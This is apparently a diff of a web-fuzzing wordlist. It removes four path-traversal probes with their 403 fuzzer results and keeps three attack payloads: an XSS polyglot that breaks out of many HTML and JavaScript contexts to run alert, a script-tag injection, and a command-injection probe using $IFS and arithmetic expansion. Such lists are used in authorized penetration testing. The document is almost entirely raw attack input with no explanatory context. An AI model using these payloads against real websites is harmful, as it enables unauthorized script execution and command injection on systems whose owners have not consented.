@@ -1,7 +1,3 @@
-[2k..%0d/                  [status: 403, size: 146, words: 3, lines: 8]
-[2k..%0d/;                 [status: 403, size: 146, words: 3, lines: 8]
-[2k..%0d;/                 [status: 403, size: 146, words: 3, lines: 8]
-[2k..;%0d/                 [status: 403, size: 146, words: 3, lines: 8]
 " onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//var str = "javascript:/*-/*`/*\`/*'/*"/**/(/* */onclick=alert() )//%0d%0a%0d%0a//</style/</title/</textarea/</script/--!>\x3csvg/<svg/onload=alert()//>\x3e";
 "%0a/><script>//alert(1)//
 "%0aecho$ifsbjuraw$((1%2b97))$(echo$ifsbjuraw)bjuraw
